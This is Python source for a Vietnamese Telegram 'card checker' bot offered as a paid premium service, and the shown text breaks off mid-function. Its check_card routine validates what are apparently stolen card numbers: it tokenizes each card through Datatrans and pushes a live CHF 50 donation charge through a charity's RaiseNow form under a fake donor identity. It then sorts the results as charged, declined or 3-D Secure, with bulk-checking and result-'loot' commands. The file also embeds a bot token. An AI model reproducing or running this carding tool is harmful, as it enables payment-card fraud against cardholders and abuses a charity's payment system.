import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
from datetime import datetime
from pytz import timezone
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- C·∫§U H√åNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- T√äN FILE & TH∆Ø M·ª§C L∆ØU TR·ªÆ ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Gi·ªõi h·∫°n cho /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Gi·ªõi h·∫°n cho /multi
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File l∆∞u ng√¥n ng·ªØ
LOG_DIR = "check_logs" # Th∆∞ m·ª•c ch√≠nh l∆∞u log
BOT_STATUS_FILE = "bot_status.json" # File l∆∞u tr·∫°ng th√°i on/off c·ªßa bot

# --- GI·ªöI H·∫†N M·∫∂C ƒê·ªäNH CHO TH√ÄNH VI√äN ---
DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
MEMBER_THREAD_LIMIT = 3 # Cho /mass
DEFAULT_MULTI_LIMIT = 10 # Cho /multi

# --- C·∫§U H√åNH M√öI GI·ªú ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BI·∫æN TO√ÄN C·ª§C ƒê·ªÇ THEO D√ïI T√ÅC V·ª§ ƒêANG CH·∫†Y ---
ACTIVE_CHECKS = set()

# --- TIN NH·∫ÆN TH√îNG B√ÅO ---
MESSAGES_VI = {
    "bot_off": "üî¥ **TH√îNG B√ÅO B·∫¢O TR√å** üî¥\n\nBot hi·ªán ƒëang t·∫°m th·ªùi ngo·∫°i tuy·∫øn ƒë·ªÉ b·∫£o tr√¨. C√°c l·ªánh check s·∫Ω kh√¥ng ho·∫°t ƒë·ªông cho ƒë·∫øn khi c√≥ th√¥ng b√°o m·ªõi. C·∫£m ∆°n s·ª± ki√™n nh·∫´n c·ªßa b·∫°n!",
    "bot_on": "üü¢ **TH√îNG B√ÅO HO·∫†T ƒê·ªòNG** üü¢\n\nBot ƒë√£ ho·∫°t ƒë·ªông tr·ªü l·∫°i. C·∫£m ∆°n b·∫°n ƒë√£ ch·ªù ƒë·ª£i!",
}
MESSAGES_EN = {
    "bot_off": "üî¥ **MAINTENANCE NOTICE** üî¥\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
    "bot_on": "üü¢ **SERVICE RESUMED NOTICE** üü¢\n\nThe bot is back online. Thank you for waiting!",
}

# --- C·∫§U H√åNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KH·ªûI T·∫†O ---
# T·∫°o th∆∞ m·ª•c log n·∫øu ch∆∞a c√≥
os.makedirs(LOG_DIR, exist_ok=True)

# --- QU·∫¢N L√ù USER & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None) # Tr·∫£ v·ªÅ None n·∫øu ch∆∞a set

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def is_bot_on():
    """Ki·ªÉm tra xem bot c√≥ ƒëang b·∫≠t hay kh√¥ng."""
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    """ƒê·∫∑t tr·∫°ng th√°i b·∫≠t/t·∫Øt cho bot."""
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def update_user_stats(user_id, user_info, counts):
    """C·∫≠p nh·∫≠t file th·ªëng k√™ chung cho c√°c user, ƒë·∫£m b·∫£o t·∫•t c·∫£ c√°c key ƒë·ªÅu t·ªìn t·∫°i."""
    stats = load_json_file(STATS_FILE)
    user_id_str = str(user_id)
    
    default_user_stat = {
        'username': None,
        'full_name': None,
        'total_charged': 0,
        'total_custom': 0,
        'total_decline': 0,
        'total_error': 0,
        'total_invalid': 0,
        'last_check_timestamp': ''
    }

    user_stat_data = stats.get(user_id_str, {})
    if isinstance(user_stat_data, dict):
        default_user_stat.update(user_stat_data)
    
    stats[user_id_str] = default_user_stat
    
    stats[user_id_str]['total_charged'] += counts.get('success', 0)
    stats[user_id_str]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str]['total_error'] += counts.get('error', 0)
    stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
    
    stats[user_id_str]['username'] = user_info.username
    stats[user_id_str]['full_name'] = user_info.full_name
    
    save_json_file(STATS_FILE, stats)

# --- C√ÅC H√ÄM C·ªêT L√ïI ---

# *** FIX L·ªñI TIMEOUT ***
# Gi·∫£m s·ªë l·∫ßn th·ª≠ l·∫°i ƒë·ªÉ tr√°nh th·ªùi gian ch·ªù qu√° l√¢u
def make_request_with_retry(session, method, url, max_retries=5, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"L·∫ßn th·ª≠ {attempt + 1}/{max_retries} cho {url} th·∫•t b·∫°i: {e}. Th·ª≠ l·∫°i sau {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: T·∫•t c·∫£ {max_retries} l·∫ßn th·ª≠ l·∫°i cho {url} ƒë·ªÅu th·∫•t b·∫°i. L·ªói cu·ªëi c√πng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "S·ªë th·∫ª (CC) ph·∫£i c√≥ t·ª´ 10-19 ch·ªØ s·ªë."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Th√°ng (MM) ph·∫£i l√† s·ªë t·ª´ 1 ƒë·∫øn 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "NƒÉm (YY) ph·∫£i c√≥ 2 ho·∫∑c 4 ch·ªØ s·ªë."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV ph·∫£i c√≥ 3 ho·∫∑c 4 ch·ªØ s·ªë."
    return True, ""

def check_card(line):
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "ƒê·ªãnh d·∫°ng ng√†y th√°ng kh√¥ng h·ª£p l·ªá (mm/yy ho·∫∑c mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Thi·∫øu d·∫•u '/' trong ph·∫ßn ng√†y th√°ng.", {}
    else:
        return 'invalid_format', line, "ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá (cc|mm|yy|cvv ho·∫∑c cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    
    bin_info = {}

    try:
        bin_to_check = cc[:6]
        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
        
        if error:
            return 'error', line, f"L·ªói ki·ªÉm tra BIN: {error}", {}
        
        if bin_response and bin_response.status_code == 200 and "not found" not in bin_response.text:
            try:
                data = bin_response.json()
                if isinstance(data, dict):
                    bin_info.update(data)
                else:
                    logger.warning(f"API BIN tr·∫£ v·ªÅ d·ªØ li·ªáu kh√¥ng ph·∫£i dictionary cho BIN {bin_to_check}: {data}")
            except json.JSONDecodeError:
                logger.warning(f"L·ªói ph√¢n t√≠ch JSON t·ª´ BIN check cho BIN {bin_to_check}")

        # *** FIX L·ªñI NONETYPE ***
        # X·ª≠ l√Ω tr∆∞·ªùng h·ª£p `country_name` l√† `None` (JSON `null`)
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
            
        tokenize_url = "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField](https://pay.datatrans.com/upp/payment/SecureFields/paymentField)"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "[https://pay.datatrans.com](https://pay.datatrans.com)", "Referer": "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8](https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8)", "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        if error: return 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response or token_response.status_code != 200: return 'error', line, f"L·ªói HTTP {getattr(token_response, 'status_code', 'N/A')} khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info
        
        payment_url = "[https://api.raisenow.io/payments](https://api.raisenow.io/payments)"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en)", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result)" }
        payment_headers = { "Content-Type": "application/json", "Origin": "[https://donate.raisenow.io](https://donate.raisenow.io)", "Referer": "[https://donate.raisenow.io/](https://donate.raisenow.io/)" }
        
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        if error: return 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong check_card cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng kh√¥ng x√°c ƒë·ªãnh: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '‚ñà' * filled_len + '‚ñë' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- C√ÅC L·ªÜNH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en' 

    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**Ch√†o m·ª´ng tr·ªü l·∫°i, {user.first_name}!**\nD√πng /help ƒë·ªÉ xem c√°c l·ªánh b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ü§ñ\n\n"
            "This bot utilizes a powerful `Charge 0.5$ Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**üåü Upgrade to Premium! üåü**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "‚úÖ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "‚úÖ **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"üÜî ID Telegram c·ªßa b·∫°n l√†: `{update.effective_user.id}`")

# <<< S·ª¨A L·ªñI /help >>>
# H√†m gi·ªù ƒë√¢y nh·∫≠n to√†n b·ªô ƒë·ªëi t∆∞·ª£ng `user` thay v√¨ ch·ªâ `user_id`
async def get_help_text(user: User, lang_code: str):
    """T·∫°o n·ªôi dung help d·ª±a tr√™n vai tr√≤ v√† ng√¥n ng·ªØ c·ªßa user."""
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)
    
    # S·ª≠ d·ª•ng f-string ƒë·ªÉ tr√°nh l·ªói KeyError t·ª´ .format()
    text_vi = {
        "public": (
            "**B·∫£ng L·ªánh C√¥ng Khai** üõ†Ô∏è\n"
            "Ch√†o m·ª´ng b·∫°n! D∆∞·ªõi ƒë√¢y l√† c√°c l·ªánh c∆° b·∫£n b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng:\n\n"
            "üîπ `/start`\n"
            "   - *M√¥ t·∫£:* Kh·ªüi ƒë·ªông bot v√† nh·∫≠n ID Telegram c·ªßa b·∫°n.\n\n"
            "üîπ `/info`\n"
            "   - *M√¥ t·∫£:* L·∫•y l·∫°i ID Telegram c·ªßa b·∫°n m·ªôt c√°ch nhanh ch√≥ng.\n\n"
            "üîπ `/help`\n"
            "   - *M√¥ t·∫£:* Hi·ªÉn th·ªã b·∫£ng tr·ª£ gi√∫p n√†y.\n\n"
            f"**N√¢ng c·∫•p Premium:**\nƒê·ªÉ s·ª≠ d·ª•ng c√°c t√≠nh nƒÉng check kh√¥ng gi·ªõi h·∫°n, vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**B·∫£ng L·ªánh Th√†nh Vi√™n** üë§\n"
            "B·∫°n ƒë√£ ƒë∆∞·ª£c c·∫•p quy·ªÅn! S·ª≠ d·ª•ng c√°c l·ªánh sau ƒë·ªÉ check th·∫ª:\n\n"
            "üîπ `/cs <th·∫ª>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra m·ªôt th·∫ª t√≠n d·ª•ng duy nh·∫•t.\n"
            "   - *V√≠ d·ª•:* `/cs 403163...|11/28|123`\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *M√¥ t·∫£:* L·∫•y th√¥ng tin c·ªßa m·ªôt ƒë·∫ßu s·ªë th·∫ª (BIN).\n"
            "   - *V√≠ d·ª•:* `/bin 403163`\n\n"
            "üîπ `/multi`\n"
            f"   - *M√¥ t·∫£:* Ki·ªÉm tra nhi·ªÅu th·∫ª trong m·ªôt tin nh·∫Øn (t·ªëi ƒëa {user_multi_limit} th·∫ª).\n"
            "   - *C√°ch d√πng:* G√µ l·ªánh v√† d√°n danh s√°ch th·∫ª b√™n d∆∞·ªõi.\n\n"
            "üîπ `/mass<s·ªë lu·ªìng>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra h√†ng lo·∫°t th·∫ª t·ª´ m·ªôt t·ªáp `.txt`.\n"
            "   - *C√°ch d√πng:* G·ª≠i t·ªáp `.txt` v√† ƒëi·ªÅn caption l√† `/mass` ho·∫∑c `/mass<s·ªë lu·ªìng>`.\n"
            "   - *V√≠ d·ª•:* `/mass3` ƒë·ªÉ ch·∫°y 3 lu·ªìng.\n\n"
            f"üí≥ **H·∫°n m·ª©c c·ªßa b·∫°n:** `{user_mass_limit}` lines/file.\n"
            f"üåü **N√¢ng c·∫•p Premium:** Li√™n h·ªá {ADMIN_USERNAME} ƒë·ªÉ check kh√¥ng gi·ªõi h·∫°n."
        )
    }
    
    text_en = {
        "public": (
            "**Public Command Menu** üõ†Ô∏è\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "üîπ `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "üîπ `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "üîπ `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** üë§\n"
            "You are authorized! Use these commands to check cards:\n\n"
            "üîπ `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n"
            "   - *Example:* `/cs 403163...|11/28|123`\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n"
            "   - *Example:* `/bin 403163`\n\n"
            "üîπ `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n"
            "   - *Usage:* Type the command and paste the card list below it.\n\n"
            "üîπ `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n"
            "   - *How to use:* Send a `.txt` file with the command as the caption.\n"
            "   - *Example:* `/mass3` to run with 3 threads.\n\n"
            f"üí≥ **Your Limit:** `{user_mass_limit}` lines/file.\n"
            f"üåü **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    admin_commands = (
        "**B·∫£ng L·ªánh Qu·∫£n Tr·ªã Vi√™n** üëë\n"
        "To√†n quy·ªÅn qu·∫£n l√Ω bot v·ªõi c√°c l·ªánh sau:\n\n"
        "**Qu·∫£n l√Ω Bot:**\n"
        "üîπ `/on`, `/off` - B·∫≠t/T·∫Øt bot v√† th√¥ng b√°o.\n\n"
        "**Qu·∫£n l√Ω User & Tin nh·∫Øn:**\n"
        "üîπ `/add <user_id>`\n"
        "üîπ `/ban <user_id>`\n"
        "üîπ `/show` - Xem danh s√°ch user.\n"
        "üîπ `/send <user_id> <tin_nh·∫Øn>`\n"
        "üîπ `/sendall <tin_nh·∫Øn>`\n\n"
        "**Qu·∫£n l√Ω Gi·ªõi h·∫°n:**\n"
        "üîπ `/addlimit <user_id> <s·ªë>`\n"
        "üîπ `/addlimitmulti <user_id> <s·ªë>`\n\n"
        "**Gi√°m s√°t & L·ªãch s·ª≠:**\n"
        "üîπ `/showcheck` - Xem th·ªëng k√™ check.\n"
        "üîπ `/lootfile <user_id>` - L·∫•y l·∫°i file k·∫øt qu·∫£."
    )

    lang_texts = text_vi if lang_code == 'vi' else text_en
    
    if user_id == ADMIN_ID:
        return f"{admin_commands}\n\n{text_vi['member'].split('üí≥ **H·∫°n m·ª©c c·ªßa b·∫°n:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}\n\n{lang_texts['public']}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)

    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("üáªüá≥ Ti·∫øng Vi·ªát", callback_data="setlang_vi"),
                InlineKeyboardButton("üá¨üáß English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui l√≤ng ch·ªçn ng√¥n ng·ªØ c·ªßa b·∫°n / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        # Truy·ªÅn to√†n b·ªô ƒë·ªëi t∆∞·ª£ng `user` v√†o h√†m
        help_text = await get_help_text(user, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("C√∫ ph√°p: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{user_to_add}` ƒë√£ c√≥ trong danh s√°ch.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"‚úÖ ƒê√£ th√™m ng∆∞·ªùi d√πng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("C√∫ ph√°p: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"üóë ƒê√£ x√≥a ng∆∞·ªùi d√πng `{user_to_ban}` v√† to√†n b·ªô log.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("üì≠ Danh s√°ch ng∆∞·ªùi d√πng tr·ªëng."); return
    
    message_lines = ["üë• **Danh s√°ch ID & H·∫°n m·ª©c:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("C√∫ ph√°p: `/addlimit <user_id> <s·ªë_d√≤ng_th√™m>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. H√£y ch·∫Øc ch·∫Øn ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t gi·ªõi h·∫°n /mass th√†nh c√¥ng!**\n\n"
                                      f"üë§ **User ID:** `{target_user_id_str}`\n"
                                      f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                      f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                      f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("C√∫ ph√°p: `/addlimitmulti <user_id> <s·ªë_th·∫ª_th√™m>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. H√£y ch·∫Øc ch·∫Øn ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t gi·ªõi h·∫°n /multi th√†nh c√¥ng!**\n\n"
                                      f"üë§ **User ID:** `{target_user_id_str}`\n"
                                      f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                      f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                      f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui l√≤ng cung c·∫•p m·ªôt BIN h·ª£p l·ªá (6-8 ch·ªØ s·ªë).\nS·ª≠ d·ª•ng: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua})
        
        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text:
            await msg.edit_text(f"‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin cho BIN `{bin_to_check}`.")
            return

        bin_info = bin_response.json()

        # *** FIX L·ªñI NONETYPE ***
        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None' # Bank name shouldn't be uppercased
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " ‚Äì ".join(bin_info_parts)
        
        response_text = (
            f"üÜî **BIN:** {bin_info_line}\n"
            f"üèõÔ∏è **Bank:** {bank}\n"
            f"üåê **Country:** {country_name} {flag}"
